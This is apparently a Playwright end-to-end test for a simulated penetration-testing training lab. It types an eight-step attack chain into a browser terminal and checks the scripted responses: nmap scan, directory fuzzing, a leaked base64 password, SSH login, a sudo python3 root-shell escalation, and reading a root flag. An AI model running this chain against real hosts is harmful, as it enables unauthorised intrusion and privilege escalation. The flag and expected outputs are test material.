import { test, expect } from '@playwright/test';

test.describe('Offensive Security - Operation BlackSky: Full Killchain Enterprise Penetration Test E2E', () => {
  test('Executes 8-Step Complete Enterprise Killchain (Nmap -> Gobuster -> Curl -> Base64 -> SSH -> Sudo -> Python GTFOBins -> Root Flag)', async ({
    page,
  }) => {
    // Navigate to Operation BlackSky Capstone Lab
    await page.goto(
      'http://localhost:3000/offensive-security/academy/os06-network-infrastructure/blind-enterprise-network/blind-network-reconnaissance-and-initial-foothold'
    );

    // Verify terminal input hydration
    const terminalInput = page.getByTestId('terminal-input').first();
    await expect(terminalInput).toBeVisible({ timeout: 10000 });

    // Step 1: Nmap Recon
    await terminalInput.click();
    await terminalInput.fill('nmap -sV 10.0.4.20');
    await page.keyboard.press('Enter');
    await expect(
      page.locator('text=Nmap scan report for ad-dc01.corp.internal (10.0.4.20)')
    ).toBeVisible({ timeout: 5000 });

    // Step 2: Web Directory Fuzzing via Gobuster
    await terminalInput.fill(
      'gobuster dir -u http://10.0.4.20 -w /usr/share/wordlists/dirb/common.txt'
    );
    await page.keyboard.press('Enter');
    await expect(page.getByText('/dev-api/backup.json').first()).toBeVisible({
      timeout: 5000,
    });

    // Step 3: Curl API Data Leak
    await terminalInput.fill('curl http://10.0.4.20/dev-api/backup.json');
    await page.keyboard.press('Enter');
    await expect(page.getByText('UGFzc3dvcmQxMjMh').first()).toBeVisible({
      timeout: 5000,
    });

    // Step 4: Base64 Token Decode
    await terminalInput.fill('echo "UGFzc3dvcmQxMjMh" | base64 -d');
    await page.keyboard.press('Enter');
    await expect(page.getByText('Password123!').first()).toBeVisible({ timeout: 5000 });

    // Step 5: SSH Initial Foothold Acquisition
    await terminalInput.fill('ssh deployer@10.0.4.20');
    await page.keyboard.press('Enter');
    await expect(page.getByText('deployer@target-corp-dmz:~$').first()).toBeVisible({
      timeout: 5000,
    });

    // Step 6: Internal Privilege Escalation Enumeration
    await terminalInput.fill('sudo -l');
    await page.keyboard.press('Enter');
    await expect(page.getByText('NOPASSWD: /usr/bin/python3').first()).toBeVisible({
      timeout: 5000,
    });

    // Step 7: GTFOBins Root Shell Escalation
    await terminalInput.fill('sudo python3 -c \'import os; os.system("/bin/bash")\'');
    await page.keyboard.press('Enter');
    await expect(
      page.getByText('Python GTFOBins root privilege escalation successful!').first()
    ).toBeVisible({ timeout: 5000 });

    // Step 8: Capture Supreme Root Flag
    await terminalInput.fill('cat /root/root.txt');
    await page.keyboard.press('Enter');
    await expect(
      page.getByText('FLAG{b7d3_0ffs3c_r00t_pr00f_4uth3nt1c}').first()
    ).toBeVisible({ timeout: 5000 });
  });
});
